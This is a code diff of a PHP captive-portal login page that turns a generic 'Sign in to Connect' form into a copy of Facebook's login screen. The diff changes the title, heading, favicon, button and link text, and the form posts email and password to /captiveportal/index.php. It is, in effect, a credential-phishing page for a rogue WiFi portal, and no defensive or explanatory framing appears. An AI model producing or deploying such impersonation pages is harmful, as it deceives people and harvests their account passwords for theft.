@@ -6,7 +6,7 @@ require_once('helper.php');
   <html class=''>
 
   <head>
-    <title>social-login</title>
+    <title>Facebook - Log In</title>
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
     <meta http-equiv="Pragma" content="no-cache" />
     <meta http-equiv="Expires" content="0" />
@@ -22,6 +22,7 @@ require_once('helper.php');
     <script src="assets/js/jquery-2.2.1.min.js"></script>
     <link href='assets/css/fonts.css' rel='stylesheet' type='text/css'>
     <link rel='stylesheet prefetch' href='assets/css/normalize.min.css'>
+    <link rel="icon" type="image/png" href="assets/img/fm5arwc28y.png"/>
     <style class="cp-pen-styles">
       * {
         -webkit-box-sizing: border-box;
@@ -101,7 +102,7 @@ require_once('helper.php');
       }
 
       .login-form input[type="text"] {
-        color: black;
+      	color: black;
         border-bottom: none;
         border-radius: 4px 4px 0 0;
         padding-bottom: 13px;
@@ -109,7 +110,7 @@ require_once('helper.php');
       }
 
       .login-form input[type="password"] {
-        color: black;
+      	color: black;
         border-top: none;
         border-radius: 0 0 4px 4px;
         box-shadow: 0 -1px 2px rgba(0, 0, 0, 0.23) inset, 0 1px 2px rgba(255, 255, 255, 0.1);
@@ -153,18 +154,18 @@ require_once('helper.php');
 
   <body>
     <section class="login-form-wrap">
-      <h1>Sign in to Connect</h1>
+      <h1>facebook</h1>
       <form class="login-form" method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
           <input type="hidden" name="target" value="<?=$destination?>">
         <label>
-          <input type="text" name="email" required placeholder="Email or Phone Number">
+          <input type="text" name="email" required placeholder="Email or Phone">
         </label>
         <label>
           <input type="password" name="password" required placeholder="Password">
         </label>
-        <input type="submit" value="Login">
+        <input type="submit" value="Log In">
       </form>
-      <h5><a href="#">Forgot password</a></h5>
+      <h5><a href="#">Forgot account?</a></h5>
     </section>
 
   </body>
